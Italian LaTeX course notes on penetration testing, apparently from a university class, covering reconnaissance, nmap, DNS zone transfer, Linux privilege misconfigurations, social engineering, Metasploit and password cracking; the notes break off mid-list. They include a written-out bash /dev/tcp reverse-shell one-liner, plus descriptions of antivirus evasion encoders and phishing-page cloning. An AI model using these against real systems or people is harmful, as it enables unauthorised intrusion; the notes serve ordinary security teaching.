\documentclass{article}
\usepackage{geometry}
\geometry{
	a4paper,
}

\begin{document}
\Large
\tableofcontents
\section{Cos'è l'hacking}
Bisogna innanzitutto fare distinzione fra DDoS ed Hacking:
\begin{itemize}
\item DDoS nega un servizio ad una qualche società/compagna, esaurendone le risorse. Il modo più gettonato è eseguire un elevato numero di connessioni verso i server che offrono i servizi, in modo da interrompere il servizio. Questo non è però hacking, non ha tecniche interessanti da sfruttare
\item Hacking: tecniche per ottenere accesso non autorizzato ala macchina (ma in realtà servirà) con lo scopo finale di proteggere la macchina su cui abbiamo ottenuto l'accesso.\\ Accedo come utente root, riporto i passi che mi hanno permesso di accedervi per far si che il cliente che ha richiesto il test possa sistemare la sicurezza
\end{itemize}
Come possono due entità comunicare in modo sicuro, in modo che ci sia integrità e confidenzialità? Si introducono appositi protocolli e tecniche crittografiche etc... in modo da rendere la sicurezza sicura. Uso TLS e mi sento abbastanza sicuro, in teoria: chi però implementa il protocollo in software può introdurre delle funzionalità nuove che si pensa siano innocue ma poi sono devastanti.\\ esempio: ricorda l'hearthbleed di openSSL, la funzionalità aggiunta era la possibilità di hearthbeat per TLS/DTLS. Vulnerabilità affligge tutti i dispositivi che utilizzano la libreria, era possibile leggere tutti i dati all'interno del dispositivo: password, cookies, etc... Non era un malware, ma una vulnerabilità derivante da ciò che si pensava essere una funzionalità. In cosa consisteva la vulnerabilità: buffer overflow, invia più caratteri di quelli necessari andando a pescare contenuti di aree di memoria adiacenti.\\ Take home message: tutte le vulnerabilità derivano dal fatto che l'utente può inserire delle informazioni in un sistema informatico che possono:
\begin{itemize}
\item avere valore sbagliato
\item avere dimensione sbagliata
\item input può essere da utente autorizzato ma malevolo
\item input da utente non autorizzato, sia malevolo che non
\end{itemize}
Problema è che input di utenti in generale vanno sempre validati in forma e contenuto, le funzioni di sicurezza non devono mai basarsi su input non validato. Questa cosa va fatta nelle sezioni più critiche del sistema: se server avesse controllato la lunghezza della parola data con quella fornita dall'utente, non ci sarebbe stato problema.\\ In linea di principio è complicato avere tutto sott'occhio, specialmente perché le configurazioni sono fatte da persone. La teoria non è uguale al mondo reale: un protocollo che in teoria funziona bene, può essere implementato male.
\subsection{Hacker vs penetration testers}
C'è una delineazione molto chiara e generale su quelle che sono le figure, con annessa legalità/illegalità. "Cappelli": figura che si è sviluppata negli anni:
\begin{itemize}
\item script kiddies: prendono programmi dalla rete e li utilizzano per attaccare le reti per "farsi un nome"
\item attivisti: motivati da scopi politici o religiosi che effettuano attacchi informatici con questi scopi
\item white hat hackers: i "buoni", operavano comunque nell'illegalità. Esperti di sicurezza, il cui scopo era di dimostrare vulnerabilità di sistemi affinché queste venissero fixate.
\item black hat hackers: operano nell'illegalità al fine di ottenere accesso non autorizzato per interessi personali: ottenere un nome nella comunità, soldi, vendetta, cerare bot-net etc... Ne fanno parte:
\begin{itemize}
\item gruppi sponsorizzati dallo stato
\item terroristi
\item spie
\end{itemize}
\end{itemize}
Tutto ciò visto fin ora opera nell'illegalità, i penetration tester invece no: il pentester ha l'autorizzazione da parte del cliente, mentre l'hacker no. Lo scopo dei pentester è quello di aumentare la consapevolezza in ambito di sicurezza, ottenendo anche permessi per fare test.\\ Non esistevano questi confini legali, ad esempio nel caso dei white hat, se qualcuno trova una vulnerabilità in un'azienda è come dirglielo: potrebbe farci causa, ignorarla etc... C'è sempre stata un "area grigia", oggi si è quasi arrivati ad un punto fisso che è quello dei bug bounties: viene dato premio in denaro dall'azienda a chi trova la vulnerabilità. Vengono dati dei limiti entro cui poter agire, se si trova la vulnerabilità si ottiene un premio in denaro.
\section{Fasi di un penetration test}
Lo scopo sarà quello di effettuare un penetration test su un sistema. Il test andrà strutturato, ci sono delle fasi prestabilite, lo scopo del test è ottenere accesso come utente con i permessi più elevati nel sistema. Il test potrebbe essere automatizzato, oppure essere fatto a mano: alcuni tool rendono veloci degli steps, ma altri step vanno fatti a mano (occorre pensare in modo creativo). 4 macro-step:
\begin{itemize}
\item gathering information
\item identificare possibili entry point
\item tentativo di accesso
\item report di ciò che è stato trovato
\end{itemize}
Il vulnerability assessment può essere automatizzato, ci sono dei tool che permettono di farlo ma può essere molto poco affidabile e produce alto rate di falsi positivi: non c'è la certezza che il sistema sia vulnerabile ad una certa vulnerabilità.\\ Invece, il penetration test ha un'accuratezza molto alta e produce un risultato binario: successo o insuccesso, quindi o il sistema non è sicuro o potrebbe essere sicuro.\\ Gli ambiti del penetration test sono vari:
\begin{itemize}
\item target recon: sfruttare software vulnerabile
\item social engineering: sfruttare interazione con le persone per ottenere informazioni riservate
\item physical facilities adult
\item ...
\end{itemize}
Un penetration test può portare a risultati che un semplice vulenaribility assessment non può, l'azienda può sistemare tutte le vulnerabilità trovate (anche in termini di persone). Nel test è fornita l'autorizzazione, ma nel contratto stipulato con l'azienda poterebbe essere possibile non accedere a determinate parti del sistema. Nel caso di un attacco hacker, le fasi sono le stesse del pentest ma in più ci sono fasi di mantenimento di acceso (dopo averlo ottenuto) e di copertura tracce.
\subsection{The killchain model: APT}
Il modello che si usa nel caso di un attacco informatico. Le fasi sono di più, ma ognuna è mappabile su quelle viste nel pentest:
\begin{itemize}
\item reconnaissance: information gathering
\item weaponization: cerco arma con cui ottenere l'accesso
\item delivery: mando payload malevolo per accedere
\item exploitation: fase in cui si esegue un exploit
\item installation: per mantenere l'accesso, posso installare malware sul PC per raccogliere informazioni nel tempo
\item command and control: l'attaccante installa un agent, che comunica con un mio server per riceve comandi al fine di ottenere controllo della macchina. È l'agent che manda pacchetti verso il server e non il viceversa
\item exfiltration: esporto informazioni utili dalla macchina
\end{itemize}
\section{Hunder the hood of applications}
Cosa accade "dietro le quinte" quando provo ad accedere ad una qualche applicazione che sta nel web: ho il mio client ed il server, di mezzo l'Internet.\\ Supponiamo di considerare un'applicazione web: per accedere ad un sito web si usa nella maggior parte dei casi uno URL per indicare la risorsa del web a cui accedere.\\ HTTP: protocollo costituito da messaggi human-readable, è possibile ispezionare i pacchetti di rete che vanno dal mio client verso il server e viceversa.\\ Lo stesso vale per SMTP e come per HTTP di default non è inclusa alcuna autenticazione (oggi è possibile configurare server SMTP per rifiutare e-mail non autenticate), ma è possibile trovar e alcuni server in cui è possibile mandare e-mail nascondendo il mittente.\\ telnet: software che permette il collegamento con un server e l'invio di messaggi, ad esempio posso richiedere una pagina web (vedo il sorgente).\\ Quello che accadeva qualche tempo fa era la possibilità di mandare mail senza specificare il mittente (no auth).
\section{Linux overview - privilegi e comandi}
\paragraph{Permessi}ad ogni file o directory di Linux è associato un utente proprietario che avrà determinati privilegi di lettura, scrittura ed esecuzione su questo file, inoltre ci saranno dei privilegi per il gruppo e per gli others.\\ I permessi vengono visti come dei bit ed è possibile cambiarli con il comando \textsf{chmod}:
\begin{itemize}
\item convertendo i bit in base 10 (101 = 4 0 2) e facendo la somma, si ottiene un valore che è possibile assegnare a user, group ed others (ad esempio chmod 666 $<$file$>$)
\item usando i flag "ugo" (user, group, owner), con il "+" o "-" a seconda se si vuole aggiungere o togliere il privilegio, ed il privilegi/o (rwe ad esempio)
\end{itemize}
\paragraph{Sudoers}la lista degli utenti nel sistema si trova nel file \textsf{/ect/passwd} e con il comando \textsf{id} $<$utente$>$ è possibile avere informazioni ulteriori sullo specifico utente.\\ Con il comando \textsf{su} è possibile effettuare il log in con un altro utente, ed è anche possibile entrare come root. \textit{L'utente di root è pericolosissimo}: può eseguire qualsiasi comando senza richiedere password e senza ottenere warning. Con il comando sudo è possibile impersonare altri utenti, utilizzando la password dell'utente corrente, la configurazione del programma è nel file \textsf{/etc/sudoers}, che se mail configurato può portare ad avere gravi vulnerabilità: avendo ad esempio un utente generico con configurazione \textsf{ALL=(root) NOPASSWD /bin/cat *} è possibile per l'utente eseguire il programma cat seguito da qualsiasi altra cosa, in quando la wildcard "*" può essere sostituita con qualsiasi altra stringa, senza necessità di password e come utente root.
\paragraph{SETUID/SETGID}i due flag \textsf{SETUID/SETGID}, se impostati, permettono di cambiare l'esecuzione di un file, e quindi del relativo processo che viene creato, rispettivamente all'utente proprietario del file o al gruppo. Questo cambio di associazione può avvenire senza necessità di password, quindi anche qui è possibile avere gravi conseguenze nel caso in cui il processo fosse vulnerabile (ad esempio ad attacchi di tipo hearthbleed / stack o heap overflow). Per poter settare i bit, è necessario settare il bit s con \textsf{chmod}, in questo modo sarà possibile cambiare il proprietario o il gruppo del processo (perché non funziona di default). Per poter scoprire quali file permettono di cercare file con bit attivi, mediante il comando \textsf{find} + flags.
\paragraph{Mount}comando per montare/smontare partizioni e vedere le partizioni disponibili. Su Linux qualunque cosa è un file, per vedere quali sono le partizioni si può controllare il file \textsf{/etc/fstab}, contiene le partizioni da montare di default. Utilità nel pentest: riesco ad ottenere l'accesso ad una macchina terza, per fare l'enumeration una volta avuto l'accesso nella macchina, ossia per poter ottenere più possibili informazioni sulla macchina, col mount possiamo avere informazione sui vari dischi, su cui poi andare a cercare i file.
\paragraph{Compression}il formato comune è .tar, l'obietto nel pentest è quello di dare la possibilità di raccogliere le informazioni insieme in modo da poterli portare sulla propria macchina per analizzarli. È possibile passare alcuni flag, la cartella in cui comprimere e cosa andare a comprimere.\\ \textit{/usr/share/wordlists} contiene un tar.gz chiamato rockyou, che contiene circa 15M di password risultate da un dataleak.
\paragraph{Processes} la lista dei processi è visibile a tutti gli utenti\footnote{anche i non privilegiati}, con \textsf{ps} otteniamo una tabella in cui abbiamo diverse informazioni utili
\paragraph{Cron} ogni Sistema Operativo è dotato di un job scheduler gestito dall'utente, i comandi o processi di cron vengono schedulati dal sistema in base a determinate impostazioni, definite in file appositi, il file principale è \textsf{/etc/crontab}: è editabile solo da root, ma leggibile da tutti gli utenti del sistema. È utile in quanto spesso, in caso di pentesting o CTF, potremmo ritrovarci nel caso in cui gli admin hanno messo degli specifici comandi nel crontab, in modo da poterli sfruttare.
\paragraph{SSH} usando coppia di pub/pr key (RSA) può essere possibile sfruttare delle mal configurazioni per poter ottenere la chiave privata, nel caso in cui non sia stata salvata correttamente. SSH è un tool molto versatile, che permettono oltre che amministrare un server, usare la macchina target per fare molte altre cose.
\paragraph{Reverse shell}se prendiamo una reverse shell, potrebbe non funzionare con \textsf{/bin/bash -i$>$\&/dev/tcp/ip/port 0$>$\&1}, è possibile mettere \textsf{/bin/bash} in un altro: \textsf{/bin/bash -c "/bin/bash -i $>$\&/dev/tcp/ip/port 0$>$\&1"}
\section{Social engineering}
Tattica molto utilizzata in ambito reale, è la metodologia che offre il rate più alto di successo in un pentest. In generale, è l'arte di manipolare le persone per fargli fare azioni che rivelano o divulgano informazioni. Un esempio, che non riguarda l'hacking, era quello di andare al Mc drive per ottenere ordini senza pagare.\\ Esempi reali: campagna di phishing, iniziata dal governo Nord koreano. L'attacco era incentrato sul creare account fake su social network, in cui venivano pubblicati articoli sulla sicurezza informatica, semplicemente collegandosi al sito dei fake researchers riuscivano ad ottenere una shell sul PC delle vittime (sfruttato uno 0 day di Google Chrome). Un altro modo era quello di condividere un progetto di Visual Studio: erano inclusi gli script di compilazione ed esecuzione, in cui c'erano delle reverse shell. La tecnica è molto attuale e raccoglie e cattura molte persone, anche ricercatori di sicurezza informatica.\\ È necessaria l'autorizzazione per effettuare questo tipo di attività, le tattiche si dividono in due insieme:
\begin{itemize}
\item remote: non c'è contatto fisico con la vittima, ad esempio una chiamata, una e-mail di phishing
\item fisiche: contatto diretto con la vittima
\end{itemize}
Esempi: sito fake, mail fake che è possibile collegare ad un sito web fake. Una delle tattiche più usate è la patch: si dice che il SO non è aggiornato/non sicuro e si chiede di scaricare la patch (che ovviamente è un virus).\\ Nella mail è sia possibile usare la tecnica della patch, sia quella del sito fake o anche l'inclusione di un allegato malevolo. Un altra  consiste nel comprare un dominio, creare un sotto-dominio noto (poste.it) per fregare quelli poco attenti. Come scoprire una fake mail: nei primi mail server da cui passa l'email, il server deve avere lo stesso dominio del mittente, altrimenti l'invio non è autenticato. Per far si che una fake mail riceva risposta ad un indirizzo diverso dal mittente (che sarà un indirizzo vero) è possibile configurare il campo \textit{reply To}: si inserisce la mail su cui si vuole la risposta\footnote{passando sul nome, si vede che l'indirizzo non è quello originale} (ad un occhio poco attento, non fa differenza)\\ Prima delle rubber ducky, si usavano chiavette usb con dentro file malevoli (in estensioni note come word o excel), da un nome "appetibile".
\paragraph{SET: Social Engineering Toolkit}presente su kali, facilita attacchi di social engineering, permette di fare clone della pagina di login di un sito web in modo che le credenziali vengano spedite su un server web di nostra scelta.\\ Nel social engineering fisico, si cerca di ottenere accesso fisico: molto pericoloso, è possibile trovare prese/dispositivi sbloccati etc... Vengono usate diverse tattiche:
\begin{itemize}
\item nuovo dipendente
\item dipendente di un'azienda di cui il target è il cliente
\end{itemize}
diversi tool per poter clonare badge (che spesso funzionano con NFC) etc...
\section{Reconnaisance}
La prima fase di un pentest è al raccolta di informazioni, fase che è fra le più lunghe: non ci si può sbagliare, una volta trovato il punto di accesso o lo buchi on non lo buchi.\\ Abbiamo un target, dove il target può essere una o più macchine, un'applicazione web o un'azienda vera e propria. Occorre raccogliere la maggior parte delle informazioni, ci sono due categorie di raccolta di informazioni:
\begin{itemize}
\item attiva
\item passiva
\end{itemize}
\subsection{Raccolta passiva}
Non c'è mai contatto diretto con la vittima, anche ad esempio visitare il sito web (c'è scambio di pacchetti, quindi è un contatto). Si intende quindi la ricerca via browser web etc..., quindi la ricerca di informazioni che sono di pubblico dominio, anche detto OSINT. Anche solo tramite l'OSINT si riescono a trovare una grande quantità di informazioni.
\subsubsection{Google Dorking}
Meccanismo di funzionamento con cui è possibile fare delle query molto precise, senza violare nulla. È possibile restringere la ricerca solo nell'URL o nel testo, anche unire più filtri, il funzionamento è \textsf{nome\_filtro:valore}.
\subsubsection{Online platforms}
Altri motori di ricerca che permettono di fare ricerche più mirate,come Wayback machine, che permettono di ritrovare versioni vecchie del sito, che da informazioni che sono state poi cancellate. Un altro sito interessante è pastebin, usato per sharare velocemente file di testo, spesso le persone lo usano pensando che sia privato.\\ C'è poi Shodan, che è un motore di ricerca per dispositivi connessi ad Internet, che permette di cercare \textbf{qualsiasi dispositivo connesso ad Internet}, ci sono dispositivi divisi per marca, ma anche per cui c'è il match con una nuova vulnerabilità.\\ Anche sui social network è possibile trovare svariate informazioni, in base ai filtri usati.
\subsubsection{Whois}
Tool a cui passiamo un dominio, che restituisce molte informazioni utili fra cui:
\begin{itemize}
\item proprietario di dominio
\item amministratore 
\item contatto tecnico
\item nameservers: l'informazione più utile, in quanto possiamo sfruttare il DNS per raccogliere ulteriori informazioni sul target. Vengono restituiti i server DNS responsabili per il dominio
\end{itemize}
spesso, se riusciamo ad ottenere il nome della persona, sappiamo l'username della persona stessa.\\
\subsubsection{Recon NG}
Framework per fare raccolta informazioni sul web, è diviso in moduli. È possibile usarlo per interagire con API di Google, Facebook etc...
\subsection{Raccolta attiva}
Map dell'infrastruttura di rete target, cercando servizi, vulnerabilità, informazioni che dovrebbero essere riservate etc... effettuando un contatto diretto col target. È questa la fase in cui si raccolgono davvero informazioni importanti.
\subsubsection{DNS}
L'informazione più importante che restituisce il \textsf{whois} sono i nameservers, possiamo usare DNS per cercare altre informazioni. 
Si parte dal root, seguono i TLD, poi i server di secondo livello e poi le foglie. L'organizzazione ad albero non permette di avere duplicati, l'albero viene diviso in zone: ad esempio, tutti i sotto-dominii di uniroma2 sono la zona di uniroma2, le zone possono essere gestite da un particolare server DNS.\\ Nel DNS, oltre a client e server c'è anche il resolver, che accetta le richieste dai client e le manda ai server. È il componente che fa si che le zone vengano gestite correttamente, permette inoltre di fare 2 tipi di richieste:
\begin{itemize}
\item ricorsive: il server risponde sempre
\item iterative: il server risponde con quale server va contattato per conoscere la risposta
\end{itemize}
Il DNS gestisce vari record, tra cui i più interessanti sono 
\begin{itemize}
\item i record NS, che forniscono i nameserver per un dominio
\item MX, che contiene i nomi dei server mail
\item CNAME, occorre per gli alias
\item TXT, contiene informazioni human readable
\end{itemize}
Per interagire con il DNS è possibile usare il comando \textsf{dig}. Per poter enumerare gli host all'interno di un dominio occorre fare forward lookup bruteforce, il contrario è reverse lookup bruteforce, con cui conoscendo un IP di partenza, è possibile (tramite i record PTR se configurati) trovare alcuni domain name mancanti.\\ C'è un tipo di attacco, che si chiama zone transfer: siccome il DNS è distribuito e quindi ci sono dei server responsabili per una zona, è possibile trasferire i dati per una zona. Con questo procedimento, il NS master invia una copia al NS slave, nell'attacco fingiamo di essere un server slave e chiediamo una copia della zona, se il server è configurato male la otteniamo. Se riusciamo, l'informazione che otteniamo è la lista di tutti gli host della zona. Si può fare con il comando \textsf{dig}:
\begin{itemize}
\item trovare il nameserver
\item effettuare \textsf{dig axsf} per far trasferire la copia della zona.
\end{itemize}
DNSRecon permette di automatizzare il reverse lookup, passando in input un range di indirizzi ip $<$startIp, endIP$>$, è possibile automatizzare anche il forward lookup.
\subsection{Enumeration}
Abbiamo una probabile lista di host, (nomi ed IP) che possiamo considerare come una probabile lista di punti di accesso. Una volta che abbiamo a disposizione un host (ci concentriamo su una macchina particolare), se sulla macchina c'è un server web allora ci sarà aperta la porta 80. Possiamo quindi interagire col server web che è in esecuzione sulla macchina, ma questa interazione è applicabile su tutte le macchine. La porta aperta lato server è sempre la stessa, una volta che il servizio è in esecuzione, mentre per il client viene scelta randomicamente dal kernel. Inoltre, per i servizi standard sono state documentate e raccomandate alcune porte (ad esempio la porta 80 per HTTP). Dobbiamo ancora raccogliere informazioni, siamo nella fase di raccolta attiva, per mappare un infrastruttura di rete è necessario scambiare pacchetti.
\subsubsection{Scansione di porte - nmap}
È un operazione effettuata anche dagli amministratori di rete, per vari motivi. L'utilità è sia lato attaccante che lato difensore, per effettuare la scansione tutti i tool devono usare TCP o UDP, spesso ci si concentra sulle scansioni TCP ma \textbf{NON DIMENTICARSI DI UDP:}può capitare di avere un servizio aperto su UDP che contiene informazioni importanti.\\ Nmap: standard del port scanning, molto robusto. Offre un risultato per una porta di 3 tipi:
\begin{itemize}
\item aperta: si completa una connessione TCP
\item chiusa: riceviamo un pacchetto di RST
\item filtrata: uno stato che viene assegnato quando il pacchetto inviato non riceve risposta
\end{itemize}
se non specifichiamo le porte su cui effettuare la scansione, nmap userà le 1000 porte più popolari. Nmap permette di specificare alcune opzioni, ad esempio il flag -S permette di spoofare il proprio indirizzo (ma per ricevere le risposte? Te la pii nder culo), l'opzione -D invece permette di specificare una lista di IP, ne verrà preso uno a cui inviare la risposta. In questo modo vengono ricevute le risposte ed è più difficile capire l'IP che effettua la scansione
\paragraph{Basic firewall evasion}nmap cerca di capire se l'host è attivo oppure no, quindi per default manda un pacchetto di ping. Se l'host non risponde, per nmap è down e quindi non inizia la scansione delle porte. Magari sappiamo che non risponde per un motivo particolare, ad esempio se vengono bloccati i pacchetti di tipo ping da un firewall o dall'host stesso, è possibile specificarlo ad nmap col flag -P0.
\paragraph{Gathering version info}per alcune porte è stato standardizzato il servizio per quella porta, ma non è vietato associare il servizio che si preferisce. Quindi, per conoscere il vero servizio e la versione del servizio dietro una porta, in quanto è utile per cercare vulnerabilità per la specifica versione. C'è il flag -sV che fa questo.\\ Di default, nmap esegue tutto l'handshake a 3 vie per connessioni TCP, questo da un punto di vista di monitoring può allertare, visto che è un grande traffico in poco tempo. Inoltre, quando viene effettuata una connessione, questa viene scritta sul log ed infine se la connessione viene instaurata ci sono le risorse allocate dal kernel nella RAM del server. Per questo, è meglio fare una scansione di tipo syn: se il server risponde syn ack, nmap manda un pacchetto di rst; se non risponde, la connessione è considerata chiusa. L'enorme vantaggio è che nei log del server non comparirà la connessione (in quanto non è mai stata creata), inoltre l'impatto sul traffico generato è molto ridotta e non vengono sprecate risorse sul server.
\paragraph{Scansioni stealth}utile in quanto non si appare nel log dell'applicazione, da informazioni in più sul server, in quanto in caso di Windows la scansione stealth restituisce l'informazione che tutte le porte sono chiuse.
\\\\ Se con nmap si prova a pingare una macchina in una sotto-rete diversa, è possibile effettuare una scansione di tipo ping: nmap, oltre ad effettuare il ping, manda anche un pacchetto TCP sulla porta 80 e se l'host è attivo risponderà con RST.\\ L'opzione di scan con l'ACK non restituirà mai una porta aperta, può solo dire se è filtrata o meno, È molto utile per scoprire se il pacchetto attraversa il firewall o IDS, in quanto ACK è un meccanismo di TCP (a differenza del SYN che instaura una connessione) e quindi un meccanismo poco sofisticato può farlo passare.
\paragraph{OS fingerprint}nmap può scoprire il SO dell'host target. Vulnerabilità di Windows: ransomware "Wannacry" di tipo 0-interaction, ovvero una volta scoperto che il SO era Windows, si lanciava l'exploit ed avevamo una shell sulla macchina target. Quindi conoscere il SO è molto importante, anche da un punto di vista difensivo per poter documentare i SO degli host.\\ nmap ha due modi di scansione:
\begin{itemize}
\item attiva: manda diversi pacchetti, è più affidabile della passiva e più veloce
\item passiva: monitoring del traffico, cerca pattern caratteristici dei SO
\end{itemize}
È prima necessario effettuare la scansione di alcune porte, restituisce diverse informazioni sulla versione del SO.\\\\ Per l'utilizzo, prima scansionare tutte le porte (salvando magari l'output su file), per poi partire con ricerche a grana più fine sulle singole porte trovate.
\\\\ Ci sono alcuni script di nmap che sono più aggressivi, quelli che fanno parte della categoria default sono i meno aggressivi e che vengono lanciati in automatico con il flag -A o -sC. Per poter rientrare nella categoria default, lo script deve avere diverse caratteristiche. È possibile specificare quali script usare mediante gli operatori and or not etc..., basta passare come stringa, ad esempio "default and safe" ed inoltre è possibile passare parametri agli script.\\
nmap ha degli script già pronti per alcune categorie, si possono usare in molti casi e riportano come informazione se il target è o meno vulnerabile.
\subsubsection{SMTP enumeration}
Per inviare e-mail in modo anonimo basta collegarsi ad un server SMTP che non gestisce autenticazione o autorizzazione. È possibile scrivere uno script nmap per fare questo controllo, quindi si prova ad inviare una e-mail (creando tutti i pacchetti del protocollo) per vedere se il server è vulnerabile o no.\\ SMTP di default non forza l'autenticazione, ma è possibile forzarla ed in particolare di autenticarsi come un possibile utente. SMTP chiederà la password se l'utente esiste, oppure chiederà una password. Immaginiamo di prendere una lista di utenti con SMTP, possiamo raccogliere questa una serie di informazioni per quel server.
\section{Weaponization}
Dopo la raccolta informazioni, ne cerchiamo di ulteriori per poter ottenere l'accesso. Avviene solo lato attacker: c'è l'exploit, così come anche il modo per sfruttarlo, ma non è ancora stato lanciato (avverrà nella fase successiva). Si parte dal servizio, che può essere mal configurato
\subsection{Samba - SMB}
Protocollo usato da Windows e Linux, permette lo scambio di cartelle e file, è abilitato di default su Windows. Negli anni è risultato molto vulnerabile, affliggeva tutte le versioni di Win fino ad XP, ma anche le successive se configurato male. Di default ascolta su porte 139 e 445 (TCP), una volta capito che su una macchina c'è Samba, si possono effettuare diversi tool per cercare le mal configurazioni, tutti si dividono in 2 categorie:
\begin{itemize}
\item tool che fanno la scansione di server Samba (come Enum4Linux)
\item tool che si comportano come client Samba
\end{itemize}
un altro modo è quello di usare script nmap (iniziano sempre col nome del protocollo).
\section{Vulenariblity assessment and penetartion testing}
\subsection{Metasploitable}
Metasploitable è una macchina virtuale Linux che presenta svariarti servizi volutamente vulnerabili (mal configurati etc) per esercitarsi. \textbf{ATTENZIONE:} è consigliato installare Metasploitable come VM con interfaccia host only e non bridged, in quanto altrimenti viene vista come una macchina nella rete (col relativo IP) e può essere usato da altri nella sotto-rete privata per accedere alla macchina host.
\paragraph{NFS}protocollo per poter condividere file e cartelle in una rete, tra client e server. Se mal configurato, è possibile che un client acceda ad una cartella, montarla sul proprio file system e poter scrivere/leggere file. Di default, l'utente fornito da NFS è con pochi privilegi, ma c'è un opzione che fa si che una volta montato la cartella, non avviene l'impersonificazione come utente \textit{nobody}, bensì come utente con il quale è stato eseguito l'accesso dalla macchina, quindi è possibile leggere/scrivere come root.
\paragraph{FTP}vulnerabilità sulla porta 21, associata ad una particolare versione: era stata aggiunta una backdoor alla compilazione del server FTP
\\\\ È importante verificare il digest dell'hash associato ai file, in modo da avere una certezza sul fatto che il file scaricato è quello corretto.
\subsection{Classificazione delle vulnerabilità}
Tutte le vulnerabilità sono state classificate: ognuna ha un numero univoco che la identifica, il CVE\footnote{Common Vulnerability Enumeration}. Con il CVE è possibile ricercare le vulnerabilità per un particolare programma.
\paragraph{CWE} Common Weakness Enumeration, che raggruppa le vulnerabilità in base alla debolezza. Questo è utile nella compilazione del report per andare a specificare il tipo di vulnerabilità. C'è anche un ranking delle CWE, stilata annualmente in base alle CWE trovate ed agli attacchi messi in atto. Può essere utile testare le vulnerabilità sul software proprio, per verificare che non siano presenti
\paragraph{Attack patterns}
(Common Attack Patterns Enumeration and Classification) È un dizionario che spiega, dato un attacco, come effettuarlo e come mitigarlo e risolverlo. Il CAPEC è un codice associato all'attacco, che permette di cercarlo, ma le stesse informazioni possono essere trovate in rete.\\\\ Per la ricerca della CVE, è possibile consultare diversi siti con DB di CVE, in cui è possibile effettuare ricerche in base a vari parametri. Una volta ottenuta la CVE, occorre trovare l'exploit per il CVE; siccome il DB è gestito dall'azienda di kali, è presente anche in kali stesso offline.
\subsection{Tool per vulnerability assessment}
Tool open source più usato per vulnerability assessment, specificando un host name su cui fare l'assessment. OpenVAS, oltre a verificare se sono presenti i CVE, fa anche altro in automatico ed è una cosa che solitamente si fa in un pen-test, in quanto questo permette di sfruttare, a partire dal report ottenuto, le possibili vulnerabilità.\\ Armitage GUI, basato su Metasploit, è presente su kali: quando viene fatta la scansione della rete (usando una versione di nmap embedded), è possibile far partire gli exploit di Metasploit automaticamente, se si riesce ad ottenere l'accesso ad una shell, questa compare in basso.
\subsection{Metasploit}
Metasploit copre tutte le fasi dell'attacco cyber viste fin ora: dalla raccolta informazioni, al weaponization, all'exploit vero e proprio e poi alle operazioni di post exploitation. Il processo prevede:
\begin{itemize}
\item scansione dell'host
\item primo accesso, mediante exploit o accesso con credenziali
\item si fa privilege escalation
\item si cercano informazioni, andando a fare il dump degli hash, che possono essere utili.
\end{itemize}
Metasploit aiuta in tutti questi step, è un framework estendibile presente in versione free su Kali. Alcune definizioni:
\begin{itemize}
\item vulnerabilità: una debolezza del sistema, che permette di effettuare un exploit
\item exploit: attacco al sistema, che utilizza una vulnerabilità usando un payload
\item un payload è un pezzo di codice che viene eseguito in un sistema vulnerabile, dopo avere exploitato tale vulnerabilità
\end{itemize}
Su Metasploit ci sono altri due concetti importanti:
\begin{itemize}
\item module: elemento chiave di Metasploit, se utilizziamo un exploit o qualsiasi alto tool questo è un modulo
\item listener: moduli particolari, che permettono di mettersi in ascolto su una porta.
\end{itemize}
Oltre a tutto ciò ci sono le interfacce di Metasploit, sia GUI che da CLI (la più usata è questa).
\paragraph{Auxiliary:}sono dei moduli usati per automatizzare dei task, ad esempio la scansione delle porte, uno script che controlla se è abilitato il login anonimo con FTP etc...
\paragraph{Encoders:}permettono di cambiare il payload, in quanto ad esempio un anti-virus può essere in grado di rilevarla. Ci sono vari encoder su Metasploit, tra i più noti c'è Shikata\_ga\_nai che è polimorfico, ovvero preso in input il file, ne produce uno con byte differenti ma identico a quello di partenza (per fregare l'anti-virus).\\\\ Tra i tool più usati c'è Msfvenom, che permette di creare payload ed applicarci sopra qualsiasi encoding, restituendo l'output in molti formati diversi.\\ Prima di eseguire msfconsole, occorre eseguire postgresql con \textsf{systemctl}, poi eseguire \textsf{msfdb init} per inizializzare il DB di metasploit
\section{Sicurezza di password}
Metodo di autenticazione più utilizzato per l'accesso a dei servizi, è importante il tema della sicurezza delle password. Sono molto frequenti i data breach nel web, che consentono a vari gruppi di rivendere o di divulgare password o hash di password trovate nei data breach. Le password vengono usate per l'autenticazione, ovvero una prova del fatto che sono chi dico di essere (relativamente ad uno username), il segreto è conosciuto solo da me e dal servizio presso cui mi autentico. Il problema sta nel protocollo usato per l'autenticazione: se qualcuno si mette in mezzo, può leggere cosa scambio nel web, ma questo può essere risolto usando protocolli appositi come TLS. L'altro problema è come memorizzare le password, sia lato client che lato server: quando un utente si registra, un server memorizza un identificativo per l'utente, lo username e la password. Ci sono diversi problemi:
\begin{itemize}
\item il servizio può essere compromesso, quindi le informazioni saranno in chiaro. Una volta entrato in possesso della password in chiaro della password, è probabile che questa sia stata riusata per altri servizi (magari con leggeri cambiamenti)
\item le password generate dagli utenti sono deboli
\end{itemize}
se la password è molto corta ($<$ 16 caratteri) diventa possibile un brute force attack, inoltre di solito l'entropia è bassa.\\ La soluzione per salvare una password prevede l'utilizzo di funzioni di hash. Oltre alle funzioni hash è possibile aggiungere del "salt" alle password, quindi l'hash sarà fatto sulla password unita a del salt.
\paragraph{Password in Linux}le password vengono cifrate nel file \textsf{/etc/shadow}, utilizza il salt oltre che alla password, usando come algoritmo SHA-512. Quando si aggiunge un nuovo utente, sia nel passwd che nello shadow la password e lo username in passwd. Qualsiasi sistema che abbia necessità di memorizzare delle password utilizza salt.
\subsection{John The Ripper}
Dopo aver ottenuto le hash della password, non è possibile risalire alla stringa che ha generato il digest: dictonary attack, in cui creo un dizionario di password e ne faccio l'hash. Se trovo una corrispondenza, ho "trovato" la password (o magari una collisione). È la tecnica che viene usata spesso, può costare molto ma essendo off-line non ci sono restrizioni. 
\\ John the Ripper è un tool che permette di crackare in diverse modalità le varie hash di password che possono servire. Inizialmente, è stato pensato per andare a testare la sicurezza della password (ad esempio per un sys admin), permette di utilizzare diverse modalità. Funziona su diverse piattaforme, la più interessante è quella CUDA (per il calcolo parallelo). Permette diversi modi di esecuzione:
\begin{itemize}
\item wordlist: prende in input la lista di hash da crackare, una lista di parole o informazioni relative all'utente per risalire alla password utente
\item modalità single: in base ad informazioni dell'utente si cerca di crackare
\item incrementale: modalità brute-force, può essere fattibile se fatto offline
\end{itemize}
tutte le modalità sono definite nel file john.conf
\paragraph{Creazione del dizionario}per creare il dizionario da usare ci sono diverse possibilità:
\begin{itemize}
\item wordlist già esistenti (ad esempio su GitHub)
